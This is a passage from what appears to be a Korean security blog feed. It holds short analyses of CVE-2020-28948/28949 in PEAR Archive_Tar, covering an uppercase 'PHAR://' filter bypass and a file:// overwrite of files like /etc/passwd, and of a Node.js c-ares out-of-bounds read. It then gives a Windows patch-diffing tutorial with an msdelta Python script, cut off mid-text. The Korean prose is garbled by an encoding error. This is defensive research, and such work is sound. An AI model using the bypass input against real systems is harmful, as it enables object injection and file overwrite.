    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/pear/Archive_Tar/issues/33">Archive_Tar Issue - multiple vulnerabilities through filename manipulation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PEAR Archive_Tar</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PEAR Archive_TarëŠ” PHPì—ì„œ TAR íŒŒì¼ì„ ì²˜ë¦¬í•˜ëŠ” ë° ì‚¬ìš©í•˜ëŠ” ì˜¤í”ˆì†ŒìŠ¤ ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤. í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ phar unseirializationê³¼ arbitrary file overwrite ë‘ ê°€ì§€ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><br>ì²« ë²ˆì§¸ ì·¨ì•½ì (CVE-2020-28948)ì€ scheme í•„í„°ë§ ìš°íšŒë¥¼ í†µí•œ unserialization ì·¨ì•½ì ì…ë‹ˆë‹¤.<p>Archive_Tarì—ëŠ” unserialization ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œê°€ ì¡´ì¬í•©ë‹ˆë‹¤.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;phar://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>ê·¸ëŸ¬ë‚˜ <code>PHAR://malicious_file.phar</code> ê³¼ ê°™ì´ ëŒ€ë¬¸ìë¡œ ì‘ì„±í•˜ë©´ í•´ë‹¹ ì½”ë“œë¥¼ ìš°íšŒí•´ unserializationì„ í†µí•œ obejct injectionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.<br><br></p><p>ë‘ ë²ˆì§¸ ì·¨ì•½ì (CVE-2020-28949)ì€ Archive_Tarì—ì„œ stream wrapperë¥¼ ì²´í¬í•˜ì§€ ì•Šì•„ ë°œìƒí•˜ëŠ” arbitrary file overwrite ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì  ë˜í•œ CVE-2020-28948ê³¼ ê°™ì€ ì½”ë“œì—ì„œ ë°œìƒí•œ ì·¨ì•½ì ìœ¼ë¡œ, <code>file://</code> schemeì— ëŒ€í•œ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šì•„ í•´ì»¤ê°€ ì„ì˜ íŒŒì¼ì„ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. phpê°€ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ì—ˆë‹¤ë©´ <code>/etc/passwd</code> íŒŒì¼ì„ í¬í•¨í•œ ì‹œìŠ¤í…œ íŒŒì¼ ë˜í•œ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>ì´ ë‘ ì·¨ì•½ì ì€ ë¬¸ìì—´ì— <code>phar://</code> ê°€ ì•„ë‹Œ <code>://</code> ê°€ í¬í•¨ë  ê²½ìš° ì´ë¥¼ í•„í„°ë§í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bypass</tag>
      
      <tag>L0ch</tag>
      
      <tag>unserialization</tag>
      
      <tag>arbitrary file overwrite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-8277: Node.js OOB Readë¥¼ í†µí•œ Denial of Service</title>
    <link href="/2020/11/30/idioth/2020-11-30/"/>
    <url>/2020/11/30/idioth/2020-11-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://livingbeef.blogspot.com/2020/11/cve-2020-8277-analysis-from-nodejs-code.html">CVE-2020-8277 Analysis: From Node.JS code to OOB Reads/Fail-Check</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Node.js<ul><li>&lt; 15.2.1</li><li>&lt; 14.15.1</li><li>&lt; 12.19.1</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Node.jsì—ì„œ OOB(Out of Bounds) Readë¥¼ í†µí•´ Denial of Serviceë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ ë§ì€ ì–‘ì˜ DNS recordë¥¼ <a href="https://github.com/nodejs/node/blob/642174a31f7c2d3a8352002095d35a2b34c1126c/src/cares_wrap.cc">c-ares ë¼ì´ë¸ŒëŸ¬ë¦¬</a>ì—ì„œ TTL recordë¥¼ parsing í•  ë•Œ ë°°ì—´ ê¸¸ì´ì˜ ê³„ì‚°ì„ ì˜ëª»í•˜ë©´ì„œ ì¼ì–´ë‚˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>c-ares ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ <code>ares_parse_aaaa_reply</code> í•¨ìˆ˜ëŠ” responseë¥¼ í¬í•¨í•˜ëŠ” <code>char* abuffer</code>, responseì˜ ê¸¸ì´ì¸ <code>alen</code>, DNS responseê°€ ë°˜í™˜ë  êµ¬ì¡°ì²´ í¬ì¸í„° <code>host</code>, TTL ë°°ì—´ì¸ <code>addrttls / naddrttls</code>ë¥¼ ì¸ìë¡œ ê°–ìŠµë‹ˆë‹¤. <code>addrttls</code>ëŠ” ë°˜í™˜ëœ TTLì˜ ì£¼ì†Œë¡œ ì±„ì›Œì§€ëŠ” ë°°ì—´ì´ê³ , <code>naddrttls</code>ëŠ” ë°˜í™˜í•  TTLì˜ ìµœëŒ€ ê°’ì…ë‹ˆë‹¤. responseì˜ reply ê°œìˆ˜ê°€ <code>addrttls</code> ë°°ì—´ë³´ë‹¤ í´ ê²½ìš°  <code>naddrttls</code>ì—ì„œ í™•ì¸ í›„ 256ê°œì˜ TTLë§Œ ì²˜ë¦¬ë˜ê³  ë‚˜ë¨¸ì§€ ë¶€ë¶„ì€ ì˜ë¦¬ê²Œ ë©ë‹ˆë‹¤. í•˜ì§€ë§Œ ì·¨ì•½ì ì€ TTLì˜ ê°œìˆ˜ì— ëŒ€í•œ ì˜ëª»ëœ ì²˜ë¦¬ê°€ ì•„ë‹ˆë¼ responseì˜ reply ê°œìˆ˜ë¥¼ ì˜ëª» ê³„ì‚°í•˜ëŠ” ê²ƒì—ì„œ ì¼ì–´ë‚©ë‹ˆë‹¤.</p><ol><li>replyì˜ ê°œìˆ˜ë¥¼ ìƒˆì„œ <code>naddrs</code>ì— ì €ì¥</li><li>TTL ë°°ì—´ ì‘ì„±(<code>naddrttls</code>ì— ì˜í•´ ì˜ë¦° <code>addrttls</code>)</li><li><code>naddrttls</code> ì¬ì‘ì„± - ì‹¤ì œ TTL ë°°ì—´ì— ì‘ì„±ëœ ê°’ë³´ë‹¤ í° ì§€ í™•ì¸í•˜ì§€ ì•Šê³  <code>naddrs</code>ë¥¼ ì§‘ì–´ë„£ìŒ</li></ol><p>ë”°ë¼ì„œ ë°˜í™˜ëœ <code>naddrttls</code>ê°€ ì‘ì„±ëœ replyì˜ TTL ê°œìˆ˜ë³´ë‹¤ ì»¤ì§€ë¯€ë¡œ OOB readê°€ ê°€ëŠ¥í•˜ê³  ì´ë¥¼ ì•…ìš©í•˜ì—¬ Denial of Service ê³µê²©ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ <code>naddrttls</code>ì— <code>naddrs</code> ê°’ì„ ë„£ì„ ë•Œ <code>naddrs</code>ì˜ ê°’ì´ <code>naddrttls</code>ë³´ë‹¤ í´ ê²½ìš° <code>naddrttls</code> ê°’ì„ ë„£ëŠ” ê²ƒìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span>(naddrttls)&#123;*naddrttls = (naddrs &gt; *naddrsttls) ? *naddrttls:naddrs;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>dos</tag>
      
      <tag>idioth</tag>
      
      <tag>node.js</tag>
      
      <tag>oob read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing ë§›ë³´ê¸° Part 2</title>
    <link href="/2020/11/29/l0ch/windows-patch-diffing-part2/"/>
    <url>/2020/11/29/l0ch/windows-patch-diffing-part2/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš” ì—¬ëŸ¬ë¶„! L0chì…ë‹ˆë‹¤. ì§€ë‚œ Windows Patch Diffingê¸€ì˜ ë¶„ëŸ‰ ì¡°ì ˆ ì‹¤íŒ¨ë¡œ íŒŒíŠ¸ 1ì— ì´ì–´ íŒŒíŠ¸ 2ë¡œ ëŒì•„ì™”ìŠµë‹ˆë‹¤! </p><p><a href="https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/">[Research]WIndows Patch Diffing ë§›ë³´ê¸° Part 1</a></p><p>ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ ì¶”ì¶œë„ í–ˆìœ¼ë‹ˆ ì´ì œ ì§„ì§œ íŒ¨ì¹˜ diffingì„ ì‹œì‘â€¦í•˜ê¸° ì „ì—! í•´ì•¼ í• ê²Œ í•œ ê°€ì§€ ë” ë‚¨ì•„ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/1.png"></p><blockquote><p>ì•„ë‹ˆ ê·¸ëŸ¼ diffingì€ ëŒ€ì²´ ì–¸ì œ í•¨?</p></blockquote><p>ìœˆë„ìš°ì—ì„œ íŒ¨ì¹˜ë¥¼ í•  ë•Œ ì–´ë–¤ ë°©ì‹ìœ¼ë¡œ í•˜ëŠ”ì§€ë¥¼ ë¨¼ì € ì•Œì•„ë´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë˜ì•¼ diffing í•  ë²„ì „ ë³„ ë°”ì´ë„ˆë¦¬ë¥¼ ìƒì„±í•  ìˆ˜ ìˆì–´ìš” ã…ã…</p><h1 id="íŒ¨ì¹˜-íŒŒì¼-ìœ í˜•"><a href="#íŒ¨ì¹˜-íŒŒì¼-ìœ í˜•" class="headerlink" title="íŒ¨ì¹˜ íŒŒì¼ ìœ í˜•"></a>íŒ¨ì¹˜ íŒŒì¼ ìœ í˜•</h1><p>ì´ì „ ê¸€ì—ì„œ ì¶”ì¶œí•œ null, forward, reverse differentialì— ëŒ€í•´ ê°„ë‹¨í•˜ê²Œ ì‚´í´ë´¤ì—ˆì£ . ì´ diff ìœ í˜•ì˜ íŒŒì¼ë“¤ì€ diffing í•  ë²„ì „ë³„ ë°”ì´ë„ˆë¦¬ë¥¼ ìƒì„±í•˜ëŠ” ë° ì•„ë˜ì™€ ê°™ì€ ì—­í• ì„ í•©ë‹ˆë‹¤.</p><ul><li><p>Forward diff</p><ul><li>ê¸°ë³¸ ë°”ì´ë„ˆë¦¬ (.1)ë¥¼ íŠ¹ì • íŒ¨ì¹˜ ìˆ˜ì¤€ê¹Œì§€ ê°€ì ¸ì˜µë‹ˆë‹¤.</li></ul></li><li><p>Reverse diff</p><ul><li>íŒ¨ì¹˜ê°€ ì ìš©ëœ ë°”ì´ë„ˆë¦¬ë¥¼ ê¸°ë³¸ ë°”ì´ë„ˆë¦¬ (.1)ë¡œ ë¡¤ë°±í•©ë‹ˆë‹¤.</li></ul></li><li><p>NULL diff</p><ul><li><p>íŒ¨ì¹˜ì—ì„œ ìƒˆ íŒŒì¼ì´ ì¶”ê°€ë  ê²½ìš° ì‚¬ìš©ë©ë‹ˆë‹¤.</p></br></li></ul></li></ul><p>diff íŒŒì¼ì„ ì´ìš©í•œ Windowsì˜ íŒ¨ì¹˜ ê³¼ì •ì…ë‹ˆë‹¤. </p><ol><li>ê¸°ì¡´ ë°”ì´ë„ˆë¦¬ ë²„ì „ì— ë§ëŠ” reverse diff íŒŒì¼ë¡œ ë¸íƒ€ íŒ¨ì¹˜í•´ ê¸°ë³¸ ë²„ì „ìœ¼ë¡œ ë¡¤ë°±</li><li>íŒ¨ì¹˜ íŒ¨í‚¤ì§€ì—ì„œ ì¶”ì¶œí•œ forward diff íŒŒì¼ë¡œ ë¸íƒ€ íŒ¨ì¹˜</li></ol><ul><li><p>NULL diffì¼ ê²½ìš° íŒ¨ì¹˜í•  ê²½ë¡œì— ë³µì‚¬</p></br></li></ul><p>ìš°ë¦¬ê°€ diffing í•  ë°”ì´ë„ˆë¦¬ë¥¼ êµ¬í•˜ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>C:\system32\WinSxS</code> ì—ì„œ diffing í•  ë°”ì´ë„ˆë¦¬ë¥¼ ì°¾ìŠµë‹ˆë‹¤. WinSxSì—ëŠ” diff íŒŒì¼ë¿ë§Œ ì•„ë‹ˆë¼ í•´ë‹¹ ë²„ì „ì˜ ë°”ì´ë„ˆë¦¬ë„ í•¨ê»˜ ë“¤ì–´ìˆìŠµë‹ˆë‹¤.</li><li>í•´ë‹¹ ë²„ì „ì˜ reverse diffë¡œ ë¸íƒ€ íŒ¨ì¹˜í•´ ê¸°ë³¸ ë²„ì „ ë°”ì´ë„ˆë¦¬ë¡œ ë¡¤ë°±í•©ë‹ˆë‹¤.</li><li>ì¶”ì¶œí•œ íŒ¨ì¹˜ íŒŒì¼ì—ì„œ íŒ¨ì¹˜í•  ë²„ì „ì˜ forward diffë¡œ ë¸íƒ€ íŒ¨ì¹˜ë¥¼ í•©ë‹ˆë‹¤.</li><li>íŒ¨ì¹˜ëœ ë°”ì´ë„ˆë¦¬ì˜ hashë¥¼ êµ¬í•˜ê³  manifest hashì™€ ë¹„êµí•´ ì •ìƒì ìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</li></ol><h1 id="íŒ¨ì¹˜-ì ìš©"><a href="#íŒ¨ì¹˜-ì ìš©" class="headerlink" title="íŒ¨ì¹˜ ì ìš©"></a>íŒ¨ì¹˜ ì ìš©</h1><p><code>ntoskrnl.exe</code> ì˜ ë²„ì „ ë³„ ë°”ì´ë„ˆë¦¬ë¥¼ ìƒì„±í•´ì„œ diffing í•´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!</p><p>diffing ëŒ€ìƒ ì„ ì •ì€ ì·¨ì•½ì  ì •ë³´ì™€ í•´ë‹¹ ì·¨ì•½ì ì˜ íŒ¨ì¹˜ ë¦´ë¦¬ì¦ˆ ë²„ì „ì„ ë³´ê³  íŒë‹¨í•˜ë©´ ë˜ê² ìŠµë‹ˆë‹¤.</p><p>powershellì—ì„œ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ë©´ WinSxSì— ì—…ë°ì´íŠ¸ëœ ë²„ì „ë³„ differential íŒŒì¼ë“¤ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>Get-ChildItem -Recurse C:\windows\WinSxS\ | ? &#123;$_.Name -eq &quot;ntoskrnl.exe&quot;&#125;</code><br><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/2.png"></p><p>í™˜ê²½ë§ˆë‹¤ ëˆ„ì ëœ ì—…ë°ì´íŠ¸ê°€ ë‹¬ë¼ì„œ ê²°ê³¼ëŠ” ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  í˜„ì¬ ì œ ìœˆë„ìš° ì‹œìŠ¤í…œì˜ <code>ntoskrnl.exe</code> ë²„ì „ì¸ 10.0.18362.1082ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì§„í–‰í•´ ë³¼ê²Œìš”.</p><p>í˜„ì¬ ntoskrnl.exe ë²„ì „ - 10.0.18362.1082</p><p>ì¶”ì¶œí•œ ntoskrnl.exe ë²„ì „ - 10.0.18362.1016</p><p>1082 ë²„ì „ì€ ì œ ì‹œìŠ¤í…œì— ì´ë¯¸ ìˆìœ¼ë‹ˆ 1016 ë²„ì „ì„ ë¸íƒ€ íŒ¨ì¹˜ë¡œ ìƒì„±í•´ë³´ê² ìŠµë‹ˆë‹¤!</p><h2 id="Patch-Script"><a href="#Patch-Script" class="headerlink" title="Patch Script"></a>Patch Script</h2><p>diff íŒ¨ì¹˜ì—ëŠ” msì—ì„œ ì§€ì›í•˜ëŠ” patch APIì¸ <code>msdelta.dll</code> ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>Vista ì´ìƒ Windowsì—ì„œëŠ” <code>msdelta.dll</code> ì´ ê¸°ë³¸ì ìœ¼ë¡œ ë‚´ì¥ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— ê°€ì ¸ë‹¤ê°€ ì“°ê¸°ë§Œ í•˜ë©´ ë˜ì£  ã…ã…</p><p>ì•„ë˜ëŠ” íŒŒì´ì¬ì„ ì‚¬ìš©í•´ ì‘ì„±í•œ msdelta íŒ¨ì¹˜ ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> (windll, wintypes, c_uint64, cast, POINTER, Union, c_ubyte, LittleEndianStructure, byref, c_size_t)<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> struct<span class="hljs-comment"># types and flags</span>DELTA_FLAG_TYPE             = c_uint64DELTA_FLAG_NONE             = <span class="hljs-number">0x00000000</span>DELTA_APPLY_FLAG_ALLOW_PA19 = <span class="hljs-number">0x00000001</span><span class="hljs-comment"># struct</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_INPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U1</span>(<span class="hljs-params">Union</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpcStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID)]_anonymous_ = (<span class="hljs-string">&#x27;u1&#x27;</span>,)_fields_ = [(<span class="hljs-string">&#x27;u1&#x27;</span>, U1),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t),(<span class="hljs-string">&#x27;Editable&#x27;</span>, wintypes.BOOL)]<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_OUTPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t)]ApplyDeltaB = windll.msdelta.ApplyDeltaBApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT,                        POINTER(DELTA_OUTPUT)]ApplyDeltaB.rettype = wintypes.BOOLDeltaFree = windll.msdelta.DeltaFreeDeltaFree.argtypes = [wintypes.LPVOID]DeltaFree.rettype = wintypes.BOOLgle = windll.kernel32.GetLastError<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">apply_patches</span>(<span class="hljs-params">buf, buf_len, patch_path</span>):</span><span class="hljs-keyword">with</span> open(patch_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> p:patch = p.read()<span class="hljs-keyword">if</span> patch[:<span class="hljs-number">2</span>] != <span class="hljs-string">b&quot;PA&quot;</span>:patch_offset = patch.find(<span class="hljs-string">b&quot;PA&quot;</span>)<span class="hljs-keyword">if</span> patch_offset != <span class="hljs-number">4</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Invalid Patch&quot;</span>)<span class="hljs-comment"># Check CRC</span>crc = int.from_bytes(patch[:<span class="hljs-number">4</span>], byteorder = <span class="hljs-string">&quot;little&quot;</span>)patch_contents = patch[<span class="hljs-number">4</span>:]<span class="hljs-keyword">if</span> zlib.crc32(patch_contents) != crc:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;CRC check failed&quot;</span>)flag = DELTA_FLAG_NONEd_dest = DELTA_INPUT()d_src = DELTA_INPUT()d_out = DELTA_OUTPUT()d_src.lpcStart = bufd_src.uSize = buf_lend_src.Editable = <span class="hljs-literal">False</span>d_dest.lpcStart = cast(patch_contents, wintypes.LPVOID)d_dest.uSize = len(patch_contents)d_dest.Editable = <span class="hljs-literal">False</span>status = ApplyDeltaB(flag, d_src, d_dest, byref(d_out))<span class="hljs-keyword">if</span> status == <span class="hljs-number">0</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Patch &quot;</span>+ patch_path + <span class="hljs-string">&quot; failed with Error code &quot;</span>+str(gle()))<span class="hljs-keyword">return</span> (d_out.lpStart, d_out.uSize)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:ap = argparse.ArgumentParser()mode = ap.add_mutually_exclusive_group(required=<span class="hljs-literal">True</span>)mode.add_argument(<span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">&quot;--input&quot;</span>, help=<span class="hljs-string">&quot;revese/forward diff file path&quot;</span>)mode.add_argument(<span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;--null&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, default=<span class="hljs-literal">False</span>, help=<span class="hljs-string">&quot;Create file from null diff&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, required=<span class="hljs-literal">True</span> , help=<span class="hljs-string">&quot;write patched file&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--patches&quot;</span>, required=<span class="hljs-literal">True</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, help=<span class="hljs-string">&quot;Patches path to apply&quot;</span>)args = ap.parse_args()<span class="hljs-keyword">with</span> open(args.input, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> r:inbuf = r.read()buf_len = len(inbuf)buf = cast(inbuf, wintypes.LPVOID) <span class="hljs-comment"># cast to void * pointer</span>alloc_list = []<span class="hljs-keyword">for</span> patch <span class="hljs-keyword">in</span> args.patches:buf, buf_len = apply_patches(buf, buf_len, patch)alloc_list.append(buf)output_buf = bytes((c_ubyte*buf_len).from_address(buf))<span class="hljs-keyword">with</span> open(args.output, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> w:w.write(output_buf)<span class="hljs-keyword">for</span> alloc <span class="hljs-keyword">in</span> alloc_list:DeltaFree(alloc)hash = hashlib.sha256(output_buf)print(str(len(args.patches)) + <span class="hljs-string">&quot; pathces successfully applied.&quot;</span>)print(<span class="hljs-string">&quot;hash : &quot;</span> + base64.b64encode(hash.digest()).decode())</code></pre><p>ì˜µì…˜ ë³„ ê¸°ëŠ¥ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p>-i :  reverse ë˜ëŠ” forward differential íŒ¨ì¹˜ í•  ë°”ì´ë„ˆë¦¬ ì§€ì •</p><p>-n : null differential</p><p>-o : íŒ¨ì¹˜ ëœ ê²°ê³¼ íŒŒì¼ ìƒì„±</p><p>-p : íŒ¨ì¹˜ diffíŒŒì¼ ì§€ì •</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\ntoskrnl.exe ^<span class="hljs-literal">-o</span> result_ntoskrnl.exe <span class="hljs-literal">-p</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\r\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/3.png"></p><p>1082 ë²„ì „ì˜ <code>ntoskrnl.exe</code>ë¥¼ ê°™ì€ ë²„ì „ì˜ reverse diff íŒŒì¼ë¡œ íŒ¨ì¹˜í•´ ê¸°ë³¸ ë²„ì „ìœ¼ë¡œ ë¡¤ë°±í•œ ê²°ê³¼ì…ë‹ˆë‹¤.</p><p>ì‚¬ì§„ê³¼ ê°™ì´ successfully applied ë©”ì‹œì§€ì™€ hash ê°’ì´ ëœ¨ë©´ íŒ¨ì¹˜ê°€ ì •ìƒì ìœ¼ë¡œ ì´ë£¨ì–´ì§„ ê²ƒì„ í™•ì¸í•  ìˆì–´ìš”.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/4.png"></p><p>ì†ì„±ì—ì„œ í™•ì¸í•´ ë³´ë©´ 10.0.18362.1 ê¸°ë³¸ ë²„ì „ìœ¼ë¡œ ë¡¤ë°±ì´ ì˜ ëë„¤ìš”!</p><p>ì´ì œ ìš°ë¦¬ê°€ ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ì—ì„œ ì¶”ì¶œí•œ <code>ntoskrnl</code>ì˜ 1016ë²„ì „ forward diffë¡œ íŒ¨ì¹˜ë¥¼ í•´ë³´ê² ìŠµë‹ˆë‹¤</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> result_ntoskrnl.exe <span class="hljs-literal">-o</span> ntoskrnl_1016.exe ^<span class="hljs-literal">-p</span> [<span class="hljs-type">EXTRACTED</span> <span class="hljs-type">PATH</span>]\\amd64_microsoft...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1016</span>...\\f\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/5.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/6.png"></p><p>ë²„ì „ì€ 1016ìœ¼ë¡œ ì˜ ì˜¬ë¼ê°„ ê²ƒ ê°™êµ°ìš”. hashë„ ë¹„êµí•´ë³´ì£ .</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/7.png"></p><p>JUNKì˜ ntoskrnl manifestì—ì„œ ì°¸ê³ í•œ hashë„ ì¼ì¹˜í•˜ë„¤ìš”! ì´ë¡œì¨ íŒ¨ì¹˜ ìŠ¤í¬ë¦½íŠ¸ë¡œ ì •ìƒì ìœ¼ë¡œ íŒ¨ì¹˜ ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Binary-Diffing"><a href="#Binary-Diffing" class="headerlink" title="Binary Diffing"></a>Binary Diffing</h1><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/8.png"></p><p>(ê¸€ì„ ì“°ê³  ìˆëŠ” ì§€ê¸ˆ ë‚´ ìƒíƒœ)</p><p>ë°”ì´ë„ˆë¦¬ íŒ¨ì¹˜ê°€ ì´ë ‡ê²Œ í˜ë“¤ ì¼ì¸ê°€..? ê²©í•˜ê²Œ ì•„ë¬´ê²ƒë„ ì•ˆí•˜ê³  ì‹¶ì–´ì¡Œì§€ë§Œ ê¸°ì™• ì“°ê¸° ì‹œì‘í•œ ê±° ëì€ ë´ì•¼ í•˜ì§€ ì•Šê² ìŠµë‹ˆê¹Œ ìœ¼ì•„ì•… ë¹¨ë¦¬ ëë‚´ê³  ìˆ  ë¨¹ìœ¼ëŸ¬ ê°€ì•¼ì§€</p><p>ë§ˆì§€ë§‰! diffing 